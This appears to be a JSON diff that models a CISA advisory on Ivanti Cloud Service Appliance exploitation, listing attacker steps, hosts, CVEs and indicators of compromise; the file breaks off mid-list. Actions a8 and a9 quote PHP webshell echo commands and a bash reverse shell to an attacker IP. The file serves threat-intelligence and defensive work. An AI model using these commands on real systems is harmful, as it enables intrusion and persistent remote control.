@@ -1,0 +1,4218 @@
+{
+ "schema_version": "1.0",
+ "name": "csa-2025-250122",
+ "provenance": {
+  "input_kind": "markdown",
+  "input_sha256": "8126e7d7b6c09cb9330f223a1a970b67aa8ced44def626cda3d23922a7353ff6",
+  "source_name": "csa-2025-250122"
+ },
+ "actions": [
+  {
+   "id": "a1",
+   "name": "Sent GET request to datetime.php to acquire session and CSRF tokens",
+   "source": "llm",
+   "description": "The threat actors first sent a GET request to datetime.php to acquire session and cross-site request forgery (CSRF) tokens.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-1"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a2",
+   "name": "Sent POST request to datetime.php using TIMEZONE input field to execute code",
+   "source": "llm",
+   "description": "Threat actors sent a POST request to datetime.php using the TIMEZONE input field to manipulate the setSystemTimeZone function and execute code, including running base64-encoded Python scripts to harvest encrypted admin credentials.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-2"
+   ],
+   "epistemic_status": "supported",
+   "attack_technique": "T1552.001",
+   "field_sources": {
+    "attack_technique": "source_quote"
+   },
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a3",
+   "name": "Exfiltrated encrypted admin credentials",
+   "source": "llm",
+   "description": "Threat actors exfiltrated encrypted admin credentials from the victim's database.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-3"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a4",
+   "name": "Decrypted encrypted admin credentials using executable in /tmp directory",
+   "source": "llm",
+   "description": "Threat actors leveraged an executable matching the regular expression php\\w{6} located in the /tmp directory to decrypt the credentials prior to exfiltration.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-4"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a5",
+   "name": "Logged in and exploited CVE-2024-9380 to execute commands from higher privileged account",
+   "source": "llm",
+   "description": "After obtaining credentials, the actors logged in and exploited CVE-2024-9380 to execute commands from a higher privileged account.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-5"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a6",
+   "name": "Sent GET request to /gsb/reports.php",
+   "source": "llm",
+   "description": "The actors successfully sent a GET request to /gsb/reports.php.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-6"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a7",
+   "name": "Sent POST request using TW_ID input field to execute code and implant webshells",
+   "source": "llm",
+   "description": "The actors immediately followed the GET request with a POST request using the TW_ID input field to execute code to implant webshells for persistence.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-7"
+   ],
+   "epistemic_status": "supported",
+   "attack_technique": "T1505.003",
+   "field_sources": {
+    "attack_technique": "source_quote"
+   },
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a8",
+   "name": "Attempted to create webshells using two different paths",
+   "source": "llm",
+   "description": "In one confirmed compromise, the threat actors tried to create webshells using two different paths: echo \"<?php system(@\\$_REQUEST['a']);\">/opt/ivanti/csa/broker/webroot/client/help.php and echo \"<?php system('/bin/sudo '. @\\$_REQUEST['a']);\" > /opt/landesk/broker/webroot/gsb/help.php.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-8"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a9",
+   "name": "Executed script to create reverse TCP command and control channel",
+   "source": "llm",
+   "description": "The actors used the exploit to execute the script: bash -i >&/dev/tcp/107.173.89[.]16/8000 0>&1 to create a reverse TCP command and control channel.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-9"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a10",
+   "name": "Used sudo commands to disable vulnerability, modify and remove webshells, and remove evidence",
+   "source": "llm",
+   "description": "The threat actors used sudo commands to disable the vulnerability in DateTimeTab.php, modify and remove webshells, and remove evidence of exploitation.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-10"
+   ],
+   "epistemic_status": "supported",
+   "attack_technique": "T1548.003",
+   "field_sources": {
+    "attack_technique": "source_quote"
+   },
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a11",
+   "name": "Performed lateral movement to Jenkins server",
+   "source": "llm",
+   "description": "Threat actors moved laterally to a Jenkins server running a vulnerable, outdated version after gaining access and establishing a foothold.",
+   "target_host_ref": "h2",
+   "evidence_refs": [
+    "evidence-11"
+   ],
+   "epistemic_status": "supported",
+   "attack_technique": "T1068",
+   "field_sources": {
+    "attack_technique": "source_quote"
+   },
+   "outcome": "succeeded",
+   "source_certainty": "hedged",
+   "epistemic_reason": "原文以不確定語氣陳述（如 may have／appears to／we believe），不是已確認的事實。",
+   "source_host_ref": "h1"
+  },
+  {
+   "id": "a12",
+   "name": "Performed discovery on CSA device using Obelisk and GoGo scanners",
+   "source": "llm",
+   "description": "Prior to moving laterally, the actors likely performed discovery on the CSA device using Obelisk and GoGo to scan for vulnerabilities.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-12"
+   ],
+   "epistemic_status": "supported",
+   "attack_technique": "T1595.002",
+   "field_sources": {
+    "attack_technique": "source_quote"
+   },
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a13",
+   "name": "Attempted to log into VPN server but were unsuccessful",
+   "source": "llm",
+   "description": "Threat actors attempted to log into the Virtual Private Network (VPN) server but were unsuccessful.",
+   "target_host_ref": "h3",
+   "evidence_refs": [
+    "evidence-13"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "failed"
+  },
+  {
+   "id": "a14",
+   "name": "Exploited CVE-2024-8963 and CVE-2024-9379 using GET and POST requests to broker.php",
+   "source": "llm",
+   "description": "In one confirmed compromise, the actors exploited CVE-2024-8963 in conjunction with CVE-2024-9379 using GET and POST requests to /client/index.php%3f.php/gsb/broker.php for initial access and attempted to create a webshell.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-14",
+    "evidence-15"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "partial"
+  },
+  {
+   "id": "a15",
+   "name": "Executed SQL injection to insert user into user_info table",
+   "source": "llm",
+   "description": "Threat actors executed a SQL injection via the lockout attempts input box to insert a user into the user_info table.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-16"
+   ],
+   "epistemic_status": "insufficient",
+   "attack_technique": "T1190",
+   "field_sources": {
+    "attack_technique": "source_quote"
+   },
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a16",
+   "name": "Attempted to login as inserted user to coerce application into running bash code",
+   "source": "llm",
+   "description": "After inserting valid bash code as a user in the user_info table, the threat actors attempted to login as the user to coerce the application into handling the bash code improperly, running echo commands to build a valid web shell.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-17"
+   ],
+   "epistemic_status": "supported",
+   "attack_technique": "T1059",
+   "field_sources": {
+    "attack_technique": "source_quote"
+   },
+   "outcome": "failed"
+  }
+ ],
+ "relations": [
+  {
+   "id": "r1",
+   "from_action": "a1",
+   "to_action": "a2",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "a2 happened after a1 as described by 'They followed this in quick succession with a POST request to the same endpoint'",
+   "evidence_refs": [
+    "evidence-18"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r2",
+   "from_action": "a2",
+   "to_action": "a3",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "a3 depends on credentials harvested by a2's code execution",
+   "evidence_refs": [
+    "evidence-19"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r3",
+   "from_action": "a3",
+   "to_action": "a4",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "a4 decrypts credentials exfiltrated in a3",
+   "evidence_refs": [
+    "evidence-4"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r4",
+   "from_action": "a3",
+   "to_action": "a5",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "a5 requires credentials obtained in a3",
+   "evidence_refs": [
+    "evidence-5"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r5",
+   "from_action": "a5",
+   "to_action": "a6",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "a6 happened after a5 as described by 'The actors successfully sent a GET request to /gsb/reports.php.'",
+   "evidence_refs": [
+    "evidence-6"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r6",
+   "from_action": "a6",
+   "to_action": "a7",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "a7 immediately followed a6 as described by 'They immediately followed this with a POST request using the TW_ID input field to execute code to implant webshells for persistence.'",
+   "evidence_refs": [
+    "evidence-20"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r7",
+   "from_action": "a7",
+   "to_action": "a8",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "a8 is part of the same confirmed compromise after a7 as described by 'In one confirmed compromise, the threat actors tried to create webshells using two different paths:'",
+   "evidence_refs": [
+    "evidence-21"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r8",
+   "from_action": "a7",
+   "to_action": "a9",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "a9 happened in the same compromise after a7 as described by 'In the same compromise, the actors used the exploit to execute the following script to create a reverse Transmission Control Protocol command and control (C2) channel:'",
+   "evidence_refs": [
+    "evidence-22"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r9",
+   "from_action": "a7",
+   "to_action": "a10",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "a10 uses sudo commands after implanting webshells in a7",
+   "evidence_refs": [
+    "evidence-23"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r10",
+   "from_action": "a10",
+   "to_action": "a11",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "a11 happened after establishing foothold and exploitation chain including a10 as described by 'In one case, there was evidence of lateral movement after the threat actors gained access and established a foothold through this exploit chain.'",
+   "evidence_refs": [
+    "evidence-24"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r11",
+   "from_action": "a11",
+   "to_action": "a12",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "a12 happened prior to lateral movement in a11 as described by 'Prior to moving laterally, the actors likely performed discovery on the CSA device using Obelisk and GoGo to scan for vulnerabilities.'",
+   "evidence_refs": [
+    "evidence-25"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r12",
+   "from_action": "a11",
+   "to_action": "a13",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "a13 happened after lateral movement attempt in a11 as described by 'The threat actors then attempted to log into the Virtual Private Network (VPN) server but were unsuccessful.'",
+   "evidence_refs": [
+    "evidence-13"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r13",
+   "from_action": "a14",
+   "to_action": "a15",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "a15 happened after initial access in a14 as described by 'After the threat actors gained initial access, they attempted to exploit CVE-2024-9379 to create a webshell to gain persistent access.'",
+   "evidence_refs": [
+    "evidence-26"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r14",
+   "from_action": "a15",
+   "to_action": "a16",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "a16 happened after a15 as described by 'After inserting valid bash code as a user in the user_info table, the threat actors attempted to login as the user.'",
+   "evidence_refs": [
+    "evidence-27"
+   ],
+   "epistemic_status": "supported"
+  }
+ ],
+ "hosts": [
+  {
+   "id": "h1",
+   "role": "Ivanti Cloud Service Appliance (CSA)",
+   "source": "llm",
+   "name": "Ivanti Cloud Service Appliance (CSA)",
+   "os_version": "4.6x versions before 519 and 5.0.1 and below",
+   "evidence_refs": [
+    "evidence-28",
+    "evidence-29",
+    "evidence-30"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "h2",
+   "role": "Jenkins server running a vulnerable, outdated version",
+   "source": "llm",
+   "name": "Jenkins server",
+   "evidence_refs": [
+    "evidence-31"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "h3",
+   "role": "Virtual Private Network (VPN) server",
+   "source": "llm",
+   "name": "VPN server",
+   "evidence_refs": [
+    "evidence-13"
+   ],
+   "epistemic_status": "supported"
+  }
+ ],
+ "services": [
+  {
+   "id": "s1",
+   "name": "Ivanti CSA database (brokerdb)",
+   "source": "llm",
+   "host_ref": "h1",
+   "evidence_refs": [
+    "evidence-32",
+    "evidence-33",
+    "evidence-34"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "s2",
+   "name": "Ivanti CSA web application",
+   "source": "llm",
+   "host_ref": "h1",
+   "evidence_refs": [
+    "evidence-35",
+    "evidence-18",
+    "evidence-36",
+    "evidence-37",
+    "evidence-14"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "s3",
+   "name": "PostgreSQL database",
+   "source": "llm",
+   "host_ref": "h2",
+   "evidence_refs": [
+    "evidence-38"
+   ],
+   "epistemic_status": "supported"
+  }
+ ],
+ "target_context": {
+  "host_refs": [
+   "h1",
+   "h2",
+   "h3"
+  ],
+  "service_refs": [
+   "s1",
+   "s2",
+   "s3"
+  ]
+ },
+ "artifacts": [
+  {
+   "name": "php\\w{6} executable",
+   "type": "tool",
+   "id": "art1",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-39"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "base64-encoded Python scripts",
+   "type": "script",
+   "id": "art2",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-40"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "webshells",
+   "type": "malware",
+   "id": "art3",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-41",
+    "evidence-37"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "reverse TCP command and control channel script",
+   "type": "script",
+   "id": "art4",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-42"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "sudo commands",
+   "type": "tool",
+   "id": "art5",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-43",
+    "evidence-44"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "Obelisk scanner",
+   "type": "tool",
+   "id": "art6",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-45"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "GoGo scanner",
+   "type": "tool",
+   "id": "art7",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-45"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "inserted user in user_info table",
+   "type": "account",
+   "id": "art8",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-46",
+    "evidence-47"
+   ],
+   "epistemic_status": "insufficient"
+  }
+ ],
+ "indicators": [
+  {
+   "id": "indicator-1",
+   "type": "cve",
+   "value": "CVE-2025-0282",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-48",
+    "evidence-49"
+   ]
+  },
+  {
+   "id": "indicator-2",
+   "type": "cve",
+   "value": "CVE-2025-0283",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-50"
+   ]
+  },
+  {
+   "id": "indicator-3",
+   "type": "cve",
+   "value": "CVE-2024-8963",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-51",
+    "evidence-52",
+    "evidence-53",
+    "evidence-54",
+    "evidence-55",
+    "evidence-56",
+    "evidence-57"
+   ]
+  },
+  {
+   "id": "indicator-4",
+   "type": "cve",
+   "value": "CVE-2024-8190",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-58",
+    "evidence-59",
+    "evidence-60",
+    "evidence-61"
+   ]
+  },
+  {
+   "id": "indicator-5",
+   "type": "cve",
+   "value": "CVE-2024-9380",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-62",
+    "evidence-63",
+    "evidence-64",
+    "evidence-65",
+    "evidence-66",
+    "evidence-67"
+   ]
+  },
+  {
+   "id": "indicator-6",
+   "type": "cve",
+   "value": "CVE-2024-9379",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-68",
+    "evidence-69",
+    "evidence-70",
+    "evidence-71",
+    "evidence-72"
+   ]
+  },
+  {
+   "id": "indicator-7",
+   "type": "domain",
+   "value": "datetime[.]php",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-73"
+   ]
+  },
+  {
+   "id": "indicator-8",
+   "type": "ip",
+   "value": "107.173.89[.]16",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-74",
+    "evidence-75",
+    "evidence-76"
+   ]
+  },
+  {
+   "id": "indicator-9",
+   "type": "domain",
+   "value": "reports[.]php",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-77"
+   ]
+  },
+  {
+   "id": "indicator-10",
+   "type": "ip",
+   "value": "142.171.217[.]195",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-78",
+    "evidence-79",
+    "evidence-80",
+    "evidence-81",
+    "evidence-82",
+    "evidence-83",
+    "evidence-84",
+    "evidence-85"
+   ]
+  },
+  {
+   "id": "indicator-11",
+   "type": "ip",
+   "value": "154.64.226[.]166",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-86",
+    "evidence-87"
+   ]
+  },
+  {
+   "id": "indicator-12",
+   "type": "ip",
+   "value": "216.131.75[.]53",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-88",
+    "evidence-89",
+    "evidence-90",
+    "evidence-91"
+   ]
+  },
+  {
+   "id": "indicator-13",
+   "type": "ip",
+   "value": "23.236.66[.]97",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-92",
+    "evidence-93",
+    "evidence-94",
+    "evidence-95"
+   ]
+  },
+  {
+   "id": "indicator-14",
+   "type": "ip",
+   "value": "38.207.159[.]76",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-96",
+    "evidence-97"
+   ]
+  },
+  {
+   "id": "indicator-15",
+   "type": "ip",
+   "value": "149.154.167[.]41",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-98"
+   ]
+  },
+  {
+   "id": "indicator-16",
+   "type": "ip",
+   "value": "95.161.76[.]100",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-99",
+    "evidence-100"
+   ]
+  },
+  {
+   "id": "indicator-17",
+   "type": "url",
+   "value": "hxxps://file.io/E50vtqmJP5aa",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-101",
+    "evidence-102"
+   ]
+  },
+  {
+   "id": "indicator-18",
+   "type": "domain",
+   "value": "file.io",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-103",
+    "evidence-104",
+    "evidence-105",
+    "evidence-106",
+    "evidence-107",
+    "evidence-108"
+   ]
+  },
+  {
+   "id": "indicator-19",
+   "type": "url",
+   "value": "hxxps://file.io/RBKuU8gicWt",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-109",
+    "evidence-110"
+   ]
+  },
+  {
+   "id": "indicator-20",
+   "type": "url",
+   "value": "hxxps://file.io/frdZ9L18R7Nx",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-111",
+    "evidence-112"
+   ]
+  },
+  {
+   "id": "indicator-21",
+   "type": "url",
+   "value": "hxxp://ip.sb",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-113",
+    "evidence-114"
+   ]
+  },
+  {
+   "id": "indicator-22",
+   "type": "domain",
+   "value": "ip.sb",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-115",
+    "evidence-116"
+   ]
+  },
+  {
+   "id": "indicator-23",
+   "type": "url",
+   "value": "hxxps://pan.xj.hk/d/",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-117",
+    "evidence-118"
+   ]
+  },
+  {
+   "id": "indicator-24",
+   "type": "domain",
+   "value": "pan.xj.hk",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-119",
+    "evidence-120"
+   ]
+  },
+  {
+   "id": "indicator-25",
+   "type": "hash",
+   "value": "6401646e701f5f47518ecef48a308a36",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-121",
+    "evidence-122"
+   ]
+  },
+  {
+   "id": "indicator-26",
+   "type": "ip",
+   "value": "108.174.199[.]200",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-123",
+    "evidence-124",
+    "evidence-125"
+   ]
+  },
+  {
+   "id": "indicator-27",
+   "type": "ip",
+   "value": "206.189.156[.]69",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-126",
+    "evidence-127"
+   ]
+  },
+  {
+   "id": "indicator-28",
+   "type": "ip",
+   "value": "156.234.193[.]18",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-128"
+   ]
+  },
+  {
+   "id": "indicator-29",
+   "type": "ip",
+   "value": "205.169.39[.]11",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-129"
+   ]
+  },
+  {
+   "id": "indicator-30",
+   "type": "ip",
+   "value": "149.154.176[.]41",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-130"
+   ]
+  },
+  {
+   "id": "indicator-31",
+   "type": "ip",
+   "value": "67.217.228[.]83",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-131"
+   ]
+  },
+  {
+   "id": "indicator-32",
+   "type": "ip",
+   "value": "203.160.72[.]174",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-132"
+   ]
+  },
+  {
+   "id": "indicator-33",
+   "type": "ip",
+   "value": "142.11.217[.]3",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-133"
+   ]
+  },
+  {
+   "id": "indicator-34",
+   "type": "ip",
+   "value": "104.168.133[.]228",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-134"
+   ]
+  },
+  {
+   "id": "indicator-35",
+   "type": "ip",
+   "value": "64.176.49[.]160",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-135",
+    "evidence-136"
+   ]
+  },
+  {
+   "id": "indicator-36",
+   "type": "ip",
+   "value": "45.141.215[.]17",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-137"
+   ]
+  },
+  {
+   "id": "indicator-37",
+   "type": "ip",
+   "value": "98.101.25[.]30",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-138"
+   ]
+  },
+  {
+   "id": "indicator-38",
+   "type": "ip",
+   "value": "134.195.90[.]71",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-139"
+   ]
+  },
+  {
+   "id": "indicator-39",
+   "type": "hash",
+   "value": "a50660fb31df96b3328640fdfbeea755",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-140"
+   ]
+  },
+  {
+   "id": "indicator-40",
+   "type": "hash",
+   "value": "698a752ec1ca43237cb1dc791700afde",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-141"
+   ]
+  },
+  {
+   "id": "indicator-41",
+   "type": "hash",
+   "value": "aa69300617faab4eb39b789ebfeb5abe",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-142"
+   ]
+  },
+  {
+   "id": "indicator-42",
+   "type": "hash",
+   "value": "c2becc553b96ba27d60265d07ec3bd6c",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-143"
+   ]
+  },
+  {
+   "id": "indicator-43",
+   "type": "hash",
+   "value": "c7d20ca6fe596009afaeb725fec8635f",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-144"
+   ]
+  },
+  {
+   "id": "indicator-44",
+   "type": "hash",
+   "value": "cacc30e2a5b2683e19e45dc4f191cebc",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-145"
+   ]
+  },
+  {
+   "id": "indicator-45",
+   "type": "hash",
+   "value": "62a611f0f1a418876b11c9df3b56885b",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-146"
+   ]
+  },
+  {
+   "id": "indicator-46",
+   "type": "hash",
+   "value": "30f57e14596f1bcad7cc4284d1af4684",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-147"
+   ]
+  },
+  {
+   "id": "indicator-47",
+   "type": "domain",
+   "value": "ast[.]fun",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-148",
+    "evidence-149"
+   ]
+  },
+  {
+   "id": "indicator-48",
+   "type": "domain",
+   "value": "gg.oyr2ohrm.eyes[.]sh",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-150"
+   ]
+  },
+  {
+   "id": "indicator-49",
+   "type": "domain",
+   "value": "ggg.oyr2ohrm.eyes[.]sh",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-151"
+   ]
+  },
+  {
+   "id": "indicator-50",
+   "type": "domain",
+   "value": "gggg.oyr2ohrm.eyes[.]sh",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-152"
+   ]
+  },
+  {
+   "id": "indicator-51",
+   "type": "domain",
+   "value": "txt.xj[.]hk",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-153"
+   ]
+  },
+  {
+   "id": "indicator-52",
+   "type": "domain",
+   "value": "book.hacktricks[.]xyz",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-154"
+   ]
+  },
+  {
+   "id": "indicator-53",
+   "type": "url",
+   "value": "https://file[.]io/1zqvMYY1dpkk",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-155"
+   ]
+  },
+  {
+   "id": "indicator-54",
+   "type": "domain",
+   "value": "file[.]io",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-156"
+   ]
+  },
+  {
+   "id": "indicator-55",
+   "type": "hash",
+   "value": "d13f71e51b38ffef6b9dc8efbed27615",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-157"
+   ]
+  },
+  {
+   "id": "indicator-56",
+   "type": "hash",
+   "value": "d88bfac2b43509abdc70308bef75e2a6",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-158",
+    "evidence-159"
+   ]
+  },
+  {
+   "id": "indicator-57",
+   "type": "hash",
+   "value": "60d5648d35bacf5c7aa713b2a0d267d3",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-160"
+   ]
+  },
+  {
+   "id": "indicator-58",
+   "type": "hash",
+   "value": "f82847bccb621e6822a3947bc9ce9621",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-161"
+   ]
+  },
+  {
+   "id": "indicator-59",
+   "type": "hash",
+   "value": "c894f55c8fa9d92e2dd2c78172cff745",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-162"
+   ]
+  },
+  {
+   "id": "indicator-60",
+   "type": "ip",
+   "value": "192.42.116[.]210",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-163"
+   ]
+  },
+  {
+   "id": "indicator-61",
+   "type": "ip",
+   "value": "82.197.182[.]161",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-164"
+   ]
+  },
+  {
+   "id": "indicator-62",
+   "type": "ip",
+   "value": "154.213.185[.]230",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-165"
+   ]
+  },
+  {
+   "id": "indicator-63",
+   "type": "ip",
+   "value": "208.105.190[.]170",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-166"
+   ]
+  },
+  {
+   "id": "indicator-64",
+   "type": "ip",
+   "value": "136.144.17[.]145",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-167"
+   ]
+  },
+  {
+   "id": "indicator-65",
+   "type": "ip",
+   "value": "136.144.17[.]133",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-168"
+   ]
